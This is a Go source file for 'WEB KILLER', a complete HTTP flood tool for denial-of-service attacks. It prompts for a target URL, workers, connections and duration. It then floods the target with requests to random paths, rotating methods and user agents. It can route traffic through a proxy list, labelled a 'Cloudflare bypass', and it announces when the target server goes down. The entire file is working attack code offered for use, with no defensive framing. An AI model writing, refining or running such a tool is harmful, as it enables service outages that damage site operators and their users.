package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ANSI color codes
const (
	Reset   = "\033[0m"
	Red     = "\033[31m"
	Green   = "\033[32m"
	Yellow  = "\033[33m"
	Cyan    = "\033[36m"
	Magenta = "\033[35m"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
	"Mozilla/5.0 (Linux; Android 10; SM-G970F)",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)",
	"curl/7.68.0",
	"Wget/1.20.3 (linux-gnu)",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0)",
}

var methods = []string{"GET", "POST", "HEAD"}

func printBanner() {
	banner := `
                                                                       
                                                                       
                                                                       
                                                                       
                               ..                                      
                      .-*@%%%%%%%%%%%%%%%%%%@#-.                       
                  -%@%%#*==-----------------=*#%%@%-                   
               *@%%*=-----+%%%%%%%%%%%%%%#=------=*%%@#                
            *%%#=--------#%%*************%%=---------=%%%*             
          %%%+-----------*%#-------------%%+------------+%%%           
        %%%=-------------=%%=------------%%=--------------=%%%         
      #%%=---------------=%%=-----------=%%=----------------=%%#       
    =%%+--------------=*%%%%=-----------=%%%%%*=--------------=%@-     
   #%#-------------=#%%%%%%%=-----------+%%%%%%%%#=-------------#%#    
  #%+------------*%%%%%%%@%%+-----------*%%%%%%%%%%%*=-----------+%%   
  @%=---------=#%%%%%%#-  *%#-----------#%#   :*%%%%%%#-----------#%:  
  %%%=-------+%%%%@#.   .*%%%-----------%%%%*.   .#%%%%%+--------#%%.  
  %%%%#-----#%%%@*   =@%%##%%-----------%%+=#%%%-   #%%%%%-----*%%%%.  
  .%%%%%*-=%%%%%   %%%*---+%%=----------%%+----*%%%   %%%%%=-*%%%%@    
    +@%%%%%%%@.  @%%------=%%+---------=%%-------=%%@  :@%%%%%%%@+     
      #%%%%%%  #%%---------%%+---------=%%---------=%@*  %%%%%%*       
        .-.   +%*----------#%*---------=%%-----------*%+   :=.         
              +%=----------*%#---------=%%-----------+%@               
              +%%*--------*%%#---------=%%%*--------*%%%               
              =%%%%+----*%%%%%---------+%%%%%+----+%%%%+               
               +%%%%%+*%%%%%%%%%%%%%%%%%%%%%%%%++%%%%%+                
                 #%%%%%%%%+ %%%%%####%%%%- *%%%%%%%%%                  
                   %%%%%%   *%%=-------#%+   %%%%%%.                   
                           :%#----------#%#                            
                           @%+----------=%%                            
                           %%+----------+%#                            
                           @%%=--------=%%#                            
                           -%%%#=----=#%%%#                            
                            #%%%%%%%%%%%%#                             
                             -%%%%%%%%%%=                              
                                +#%%#+.                                
                                                                       
                                                                       
                                                                       

      WEB KILLER - Version 1.6

Made by Piwiii2.0 
`
	fmt.Print(Cyan)
	fmt.Println(banner)
	fmt.Print(Reset)
}

func randomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func randomMethod() string {
	return methods[rand.Intn(len(methods))]
}

func randomPath() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func loadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}
	return proxies, scanner.Err()
}

func newClientWithProxy(proxyStr string, maxConns int) (*http.Client, error) {
	proxyURL, err := url.Parse(proxyStr)
	if err != nil {
		return nil, err
	}

	tr := &http.Transport{
		Proxy:               http.ProxyURL(proxyURL),
		MaxIdleConns:        maxConns,
		MaxConnsPerHost:     maxConns,
		IdleConnTimeout:     5 * time.Second,
		DisableCompression:  true,
		TLSHandshakeTimeout: 3 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 3 * time.Second,
		}).DialContext,
	}

	client := &http.Client{
		Timeout:   6 * time.Second,
		Transport: tr,
	}
	return client, nil
}

var serverDownShown int32 = 0 // pour message unique serveur down

func sendRequest(client *http.Client, baseURL string) bool {
	method := randomMethod()
	url := baseURL + randomPath()

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "no-cache")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode == 500 || resp.StatusCode == 502 || resp.StatusCode == 503 || resp.StatusCode == 504 {
		if atomic.CompareAndSwapInt32(&serverDownShown, 0, 1) {
			fmt.Println(Red + "❌ Server is down." + Reset)
		}
		return false
	}

	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

func runAttack() {
	rand.Seed(time.Now().UnixNano())

	reader := bufio.NewReader(os.Stdin)

	fmt.Print(Yellow + "🌐 Target URL (e.g. https://example.com): " + Reset)
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	fmt.Print(Yellow + "Cloudflare bypass (y/n): " + Reset)
	bypassResp, _ := reader.ReadString('\n')
	bypassResp = strings.TrimSpace(strings.ToLower(bypassResp))

	var proxies []string
	var err error
	useProxies := false

	if bypassResp == "y" {
		proxies, err = loadProxies("http.txt")
		if err != nil {
			fmt.Println(Red + "⚠️ Failed to load proxies from http.txt, proceeding without proxies." + Reset)
		} else if len(proxies) == 0 {
			fmt.Println(Red + "⚠️ Proxy list is empty, proceeding without proxies." + Reset)
		} else {
			useProxies = true
			fmt.Println(Green + "✅ Loaded", len(proxies), "proxies." + Reset)
		}
	}

	fmt.Print(Yellow + "🔧 Number of workers: " + Reset)
	wStr, _ := reader.ReadString('\n')
	workers, err := strconv.Atoi(strings.TrimSpace(wStr))
	if err != nil || workers < 1 {
		fmt.Println(Red + "⚠️ Invalid number of workers. Using 10." + Reset)
		workers = 10
	}

	fmt.Print(Yellow + "🔗 Connections per worker: " + Reset)
	cStr, _ := reader.ReadString('\n')
	connections, err := strconv.Atoi(strings.TrimSpace(cStr))
	if err != nil || connections < 1 {
		fmt.Println(Red + "⚠️ Invalid number of connections per worker. Using 10." + Reset)
		connections = 10
	}

	fmt.Print(Yellow + "⏱️ Duration (in seconds): " + Reset)
	dStr, _ := reader.ReadString('\n')
	durationSec, err := strconv.Atoi(strings.TrimSpace(dStr))
	if err != nil || durationSec < 1 {
		fmt.Println(Red + "⚠️ Invalid duration. Using 30 seconds." + Reset)
		durationSec = 30
	}
	attackDuration := time.Now().Add(time.Duration(durationSec) * time.Second)

	fmt.Println(Green + "🚀 Attack starting..." + Reset)

	var totalSuccess int64
	var totalFail int64
	serverDownShown = 0
	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			var client *http.Client
			if useProxies {
				proxyStr := proxies[rand.Intn(len(proxies))]
				c, err := newClientWithProxy(proxyStr, connections)
				if err != nil {
					client = &http.Client{
						Timeout: 6 * time.Second,
						Transport: &http.Transport{
							MaxIdleConns:        connections,
							MaxConnsPerHost:     connections,
							IdleConnTimeout:     5 * time.Second,
							DisableCompression:  true,
							TLSHandshakeTimeout: 3 * time.Second,
							DialContext: (&net.Dialer{
								Timeout:   3 * time.Second,
								KeepAlive: 3 * time.Second,
							}).DialContext,
						},
					}
				} else {
					client = c
				}
			} else {
				client = &http.Client{
					Timeout: 6 * time.Second,
					Transport: &http.Transport{
						MaxIdleConns:        connections,
						MaxConnsPerHost:     connections,
						IdleConnTimeout:     5 * time.Second,
						DisableCompression:  true,
						TLSHandshakeTimeout: 3 * time.Second,
						DialContext: (&net.Dialer{
							Timeout:   3 * time.Second,
							KeepAlive: 3 * time.Second,
						}).DialContext,
					},
				}
			}

			for time.Now().Before(attackDuration) {
				if sendRequest(client, target) {
					atomic.AddInt64(&totalSuccess, 1)
				} else {
					atomic.AddInt64(&totalFail, 1)
				}
			}
		}(i)
	}

	wg.Wait()

	duration := float64(durationSec)
	total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
	rps := float64(total) / duration

	fmt.Println("\n" + Magenta + "🧨 Attack complete. Results:" + Reset)
	fmt.Printf("%s✅ Success requests : %d%s\n", Green, atomic.LoadInt64(&totalSuccess), Reset)
	fmt.Printf("%s❌ Failed requests  : %d%s\n", Red, atomic.LoadInt64(&totalFail), Reset)
	fmt.Printf("%s⏱️ Duration         : %.2f seconds%s\n", Cyan, duration, Reset)
	fmt.Printf("%s📈 Average RPS      : %.2f req/sec%s\n", Yellow, rps, Reset)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	printBanner()
	reader := bufio.NewReader(os.Stdin)

	for {
		runAttack()

		fmt.Print(Yellow + "\n🔄 Do you want to start another attack? (y/n): " + Reset)
		again, _ := reader.ReadString('\n')
		again = strings.TrimSpace(strings.ToLower(again))

		if again != "y" {
			fmt.Println(Green + "👋 Bye! Stay safe." + Reset)
			break
		}
	}
}
